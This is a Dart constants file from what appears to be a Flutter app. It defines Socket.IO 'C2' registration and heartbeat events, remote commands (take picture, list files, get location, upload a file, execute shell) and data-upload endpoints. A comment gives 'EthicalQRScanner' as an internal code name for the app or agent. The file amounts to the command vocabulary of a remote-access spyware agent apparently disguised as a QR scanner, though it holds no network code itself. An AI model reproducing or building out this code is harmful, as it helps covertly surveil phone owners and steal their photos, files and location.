// lib/utils/constants.dart

// --- SharedPreferences Keys ---
const String PREF_INITIAL_DATA_SENT = 'initialDataSent';
const String PREF_DEVICE_ID = 'pref_device_id'; // لحفظ مُعرف الجهاز الفريد

// --- Background Service Events (Flutter internal) ---
const String BG_SERVICE_EVENT_SEND_INITIAL_DATA = 'sendInitialData';
const String BG_SERVICE_EVENT_STOP_SERVICE = 'stopService';

// --- Socket.IO C2 Communication Events & Commands ---
// For C2 Registration and Heartbeat
const String SIO_EVENT_REGISTER_DEVICE = 'register_device'; // Client to Server
const String SIO_EVENT_REGISTRATION_SUCCESSFUL =
    'registration_successful'; // Server to Client
const String SIO_EVENT_DEVICE_HEARTBEAT =
    'device_heartbeat'; // Client to Server
const String SIO_EVENT_REQUEST_REGISTRATION_INFO =
    'request_registration_info'; // Server to Client (if client connects without registering)

// Commands from C2 Server to Client
const String SIO_CMD_TAKE_PICTURE = 'command_take_picture';
const String SIO_CMD_LIST_FILES = 'command_list_files';
const String SIO_CMD_GET_LOCATION = 'command_get_location';
const String SIO_CMD_UPLOAD_SPECIFIC_FILE =
    'command_upload_specific_file'; // Added
const String SIO_CMD_EXECUTE_SHELL = 'command_execute_shell'; // Added

// Response from Client to C2 Server
const String SIO_EVENT_COMMAND_RESPONSE =
    'command_response'; // Client to Server

// --- HTTP Endpoints (Reminder, main URL is in app_config.dart) ---
const String HTTP_ENDPOINT_UPLOAD_INITIAL_DATA = '/upload_initial_data';
const String HTTP_ENDPOINT_UPLOAD_COMMAND_FILE = '/upload_command_file';

// --- Other Constants ---
const String APP_NAME =
    "EthicalQRScanner"; // اسم رمزي داخلي للتطبيق أو لل Agent
